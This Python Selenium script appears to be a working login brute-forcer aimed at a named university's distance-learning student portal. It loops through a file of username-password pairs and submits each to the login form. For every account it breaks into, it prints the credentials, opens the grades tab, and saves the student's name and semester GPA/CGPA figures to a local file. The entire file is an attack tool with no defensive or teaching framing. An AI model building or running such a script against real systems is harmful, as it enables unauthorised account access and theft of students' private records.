from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from termcolor import colored

url = 'http://mysgs.smuc.edu.et/distance'
#input('[+] Enter Page URL: ')
login_failed_string = 'Invalid Password'
#input('[+] Enter String That Occurs When Login Fails: ')
#button_name = input('[+] Enter Name of the Button to Click: ')
credentials_file = 'D:/Downloads/pass.txt'
#input('[+] Enter File Containing Usernames and Passwords (line-by-line): ')

driver = webdriver.Chrome()  # Replace with your preferred browser's WebDriver

def cracking():
    with open(credentials_file, 'r') as file:
        for line in file:
            username, password = line.strip().split()
            print(colored(f'Trying: {username} : {password}', 'red'))
            try:
                driver.get(url)

                # Find username and password fields using their names
                username_field = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "ID"))
                )
                password_field = driver.find_element(By.NAME, "PASS")

                # Enter credentials and submit
                username_field.send_keys(username)
                password_field.send_keys(password)
                submit_button = driver.find_element(By.NAME, "submit")  # Assuming a button named "Login"
                submit_button.click()

                # Check for login success or failure
                if login_failed_string in driver.page_source:
                    pass
                else:
                    # Click the desired button
                    #button = driver.find_element(By.NAME, button_name)
                    #button.click()
                    print(colored(f'[+] Found Username: ==> {username}', 'green'))
                    print(colored(f'[+] Found Password: ==> {password}', 'green'))
                    try: 
                        div_element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[@id='tabsF']")))  # Replace with the div's XPath)
                        third_li = div_element.find_element(By.XPATH, ".//ul/li[2]")  # Target the third LI within the UL
                        span_element = third_li.find_element(By.XPATH, ".//span") 
                        span_element.click()
                        print(colored(f"[+] Third LI element clicked successfully!", "green"))
    
                    except Exception as e:
                        print(colored(f"[!] Error clicking: {e}", "red"))

                
                    try:
                        text_section = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[@id='center1']")))
                        

                        gpa1 = text_section.find_element(By.XPATH, ".//table[5]/tbody/tr[2]/td[4]/font")
                        gpa2 = text_section.find_element(By.XPATH, ".//table[5]/tbody/tr[3]/td[4]/font")


                        gpa3 = text_section.find_element(By.XPATH, ".//table[8]/tbody/tr[2]/td[4]/font")
                        gpa4 = text_section.find_element(By.XPATH, ".//table[8]/tbody/tr[3]/td[4]/font")

                        gpa5 = text_section.find_element(By.XPATH, ".//table[11]/tbody/tr[2]/td[4]/font")
                        gpa6 = text_section.find_element(By.XPATH, ".//table[11]/tbody/tr[3]/td[4]/font")


                        gpa7 = text_section.find_element(By.XPATH, ".//table[14]/tbody/tr[2]/td[4]/font")
                        gpa8 = text_section.find_element(By.XPATH, ".//table[14]/tbody/tr[3]/td[4]/font")


                        gpa9 = text_section.find_element(By.XPATH, ".//table[17]/tbody/tr[2]/td[4]/font")
                        gpa10 = text_section.find_element(By.XPATH, ".//table[17]/tbody/tr[3]/td[4]/font")
                        
                        name = text_section.find_element(By.XPATH, ".//table[1]/tbody/tr[2]/td[2]/font/strong/font")
                        # Extract the text content

                        Fname = name.text

                        gpa1 = gpa1.text
                        gpa2 = gpa2.text
                        gpa3 = gpa3.text
                        gpa4 = gpa4.text
                        gpa5 = gpa5.text
                        gpa6 = gpa6.text
                        gpa7 = gpa7.text
                        gpa8 = gpa8.text
                        gpa9 = gpa9.text
                        gpa10 = gpa10.text

                        
                        
                        with open("GPA_credentials.txt", "a") as file:  # Open a file for writing
                            file.write(f"{username}\t\t")
                            file.write(Fname + "\n")
                            file.write(f"GPA\t\tCGPA\n")


                            file.write(gpa1 + "\t\t" + gpa2 + "\t1st,1st\n")

                            
                            file.write(gpa3 + "\t\t" + gpa4 + "\t1st,2nd\n")

                            
                            file.write(gpa5 + "\t\t" + gpa6 + "\t1st,3rd\n")


                            file.write(gpa7 + "\t\t" + gpa8 + "\t2nd,1st\n")


                            file.write(gpa9 + "\t\t" + gpa10 + "\t2nd,1st\n")

                
                            
                            file.write(f"\n***\n")

                            print(colored(f"[+] Credentials saved to cracked_credentials.txt!", "green"))
                    except NoSuchElementException:
                            print("Element not found. Continuing...")
                    #print(colored(f'[+] Button Clicked Successfully!', 'green'))
                        
                    try: 
                        div_element2 = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[@id='tabsF']")))  # Replace with the div's XPath)
                        fifth_li = div_element2.find_element(By.XPATH, ".//ul/li[5]")  # Target the third LI within the UL
                        span_element2 = fifth_li.find_element(By.XPATH, ".//span") 
                        span_element2.click()
                        print(colored(f"[+] fifth LI element clicked successfully!", "green"))
    
                    except Exception as e:
                        print(colored(f"[!] Error clicking: {e}", "red"))

                        
                    #break

            except Exception as e:
                print(colored(f'[!] Error: {e}', 'red'))
                continue

cracking()

driver.quit()
